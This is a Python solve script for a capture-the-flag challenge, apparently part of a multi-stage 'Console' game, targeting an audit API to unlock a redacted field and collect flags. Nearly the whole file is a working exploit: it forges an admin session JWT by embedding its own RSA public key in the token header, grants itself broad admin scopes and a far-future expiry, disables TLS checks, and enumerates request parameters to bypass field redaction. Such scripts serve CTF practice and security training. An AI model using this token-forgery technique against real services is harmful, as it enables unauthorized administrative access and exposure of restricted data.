#!/usr/bin/env python3
"""ACT 4 — 'The Console'. Phase 11: unlock the restricted audit_note.
TX-9f2b6a1e4c7d8035 summary view redacts restricted_fields=['audit_note']. The
server error lists the SUPPORTED views; the ledger said this transfer was flagged
for 'compliance sign-off'. Enumerate supported views and read audit_note -> path/flag."""
import re, json, base64
import requests, urllib3
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
urllib3.disable_warnings()
A="https://audit.hackthe.website"
FLAG=re.compile(r'dome\.ctf\{[^}]+\}'); flags=set()
def b64u_dec(s): return base64.urlsafe_b64decode(s+"="*(-len(s)%4))
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def jseg(o): return b64u(json.dumps(o,separators=(",",":")).encode())
def int_b64u(x): return b64u(x.to_bytes((x.bit_length()+7)//8,"big"))
def scan(t,w):
    for m in FLAG.finditer(str(t)):
        if m.group() not in flags: flags.add(m.group()); print(f"   *** FLAG [{w}]: {m.group()} ***")

s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
s.post(f"{A}/api/v1/auth/login", json={"username":"svc-probe","password":"x"}, timeout=15)
p0=json.loads(b64u_dec(s.cookies.get("console_session").split(".")[1]))
priv=rsa.generate_private_key(public_exponent=65537,key_size=2048); pn=priv.public_key().public_numbers()
myjwk={"kty":"RSA","n":int_b64u(pn.n),"e":int_b64u(pn.e),"alg":"RS256","use":"sig","kid":"console-2026"}
hdr={"alg":"RS256","typ":"JWT","kid":"console-2026","jwk":myjwk}
BROAD=("console:basic audit:read audit:export audit:admin finance:audit finance:read "
       "finance:admin export:manage marketplace:read marketplace:admin admin")
pl=dict(p0); pl.update({"sub":"admin","role":"admin","scope":BROAD,"exp":4102444800,"iat":1600000000})
si=jseg(hdr)+"."+jseg(pl); tok=si+"."+b64u(priv.sign(si.encode(),padding.PKCS1v15(),hashes.SHA256()))
adm=requests.Session(); adm.verify=False
adm.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
adm.cookies.set("console_session", tok, domain="audit.hackthe.website")

TX="TX-9f2b6a1e4c7d8035"
# 1) full error -> supported views
r=adm.post(f"{A}/api/v1/transactions/{TX}", json={"view":{"__probe__":True}}, timeout=15)
print("supported-views error:\n ", r.text)
supported=[]
try: supported=r.json().get("supported") or r.json().get("supported_views") or []
except: pass
m=re.search(r'\[([^\]]*)\]', r.text)
if not supported and m:
    supported=[x.strip().strip('"\'' ) for x in m.group(1).split(",")]
# add narrative guesses
for g in ["summary","compliance","forensic","audit","legal","legal_hold","investigation","full_detail","detailed","sign_off","signoff","reviewer","privileged"]:
    if g not in supported: supported.append(g)
print("views to try:", supported)

# 2) try each supported view (as boolean, and as view string) ; read audit_note
def show(resp, label):
    try: j=resp.json()
    except: print(f"  [{resp.status_code}] {label}: {resp.text[:120]}"); scan(resp.text,label); return
    an = j.get("audit_note")
    print(f"  [{resp.status_code}] {label}: audit_note={an!r} restricted={j.get('restricted_fields')}")
    scan(json.dumps(j), label)
    if an: print("     FULL:", json.dumps(j))

for v in supported:
    show(adm.post(f"{A}/api/v1/transactions/{TX}", json={"view":{v:True}}, timeout=15), f'view={{{v}:true}}')
# also the RFC-style: view as a string, and view with mode key
for body in [{"view":"compliance"},{"view":{"mode":"compliance"}},{"view":{"name":"compliance"}},
             {"view":{"type":"compliance"}},{"view":{"summary":True,"compliance":True}}]:
    try:
        r=adm.post(f"{A}/api/v1/transactions/{TX}", json=body, timeout=15); show(r, json.dumps(body))
    except Exception as e: print("  err",e)

print("\nFLAGS:", sorted(flags) or "(none yet)")
